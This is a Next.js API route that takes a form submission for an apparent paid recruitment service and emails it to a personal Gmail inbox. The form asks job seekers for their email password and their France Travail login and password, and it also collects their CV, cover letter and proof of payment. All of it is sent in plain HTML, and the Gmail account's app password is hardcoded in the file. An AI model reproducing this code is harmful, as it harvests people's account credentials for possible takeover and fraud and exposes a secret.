import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(req: Request) {
  try {
    const formData = await req.formData();
    
    // Récupération des textes
    const pack = formData.get('pack');
    const emailDedicace = formData.get('emailDedicace');
    const passwordDedicace = formData.get('passwordDedicace');
    const identifiantFT = formData.get('identifiantFT');
    const passwordFT = formData.get('passwordFT');
    const methodePaiement = formData.get('methodePaiement');

    // Récupération des fichiers
    const cv = formData.get('cv') as File;
    const letter = formData.get('letter') as File;
    const proof = formData.get('proof') as File;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'andregomis3954@gmail.com',
        pass: 'elde udir vmrr qdsj', 
      },
    });

    const attachments = [];
    if (cv) attachments.push({ filename: cv.name, content: Buffer.from(await cv.arrayBuffer()) });
    if (letter) attachments.push({ filename: letter.name, content: Buffer.from(await letter.arrayBuffer()) });
    if (proof) attachments.push({ filename: proof.name, content: Buffer.from(await proof.arrayBuffer()) });

    await transporter.sendMail({
      from: '"Recrutement Direct" <andregomis3954@gmail.com>',
      to: 'andregomis3954@gmail.com',
      subject: `NOUVELLE COMMANDE : Pack ${pack}`,
      html: `
        <h2>Détails du Dossier</h2>
        <p><strong>Pack :</strong> ${pack}</p>
        <p><strong>Paiement :</strong> ${methodePaiement}</p>
        <hr/>
        <h3>Accès Candidat</h3>
        <p><strong>Email :</strong> ${emailDedicace}</p>
        <p><strong>Pass Email :</strong> ${passwordDedicace}</p>
        <p><strong>ID France Travail :</strong> ${identifiantFT}</p>
        <p><strong>Pass France Travail :</strong> ${passwordFT}</p>
      `,
      attachments
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: "Erreur envoi" }, { status: 500 });
  }
}